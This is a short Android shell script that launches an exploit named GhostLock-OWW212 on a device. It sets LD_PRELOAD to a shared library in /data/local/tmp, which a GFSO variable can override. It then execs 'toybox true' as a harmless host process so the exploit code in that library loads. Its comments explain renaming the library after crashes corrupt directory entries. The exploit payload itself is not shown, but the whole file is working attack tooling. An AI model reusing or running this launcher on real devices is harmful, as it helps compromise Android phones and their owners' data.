#!/system/bin/sh
# On-device launcher for the GhostLock-OWW212 exploit: LD_PRELOAD carries the
# whole exploit, and `toybox true` is just a harmless host process to load it
# into. GFSO lets the caller pick which .so to use, because a crash can poison a
# directory entry in /data/local/tmp and then that name is unusable (even `rm`
# returns EACCES), so every fire gets a fresh name.
export LD_PRELOAD=${GFSO:-/data/local/tmp/gs.so}
exec /system/bin/toybox true
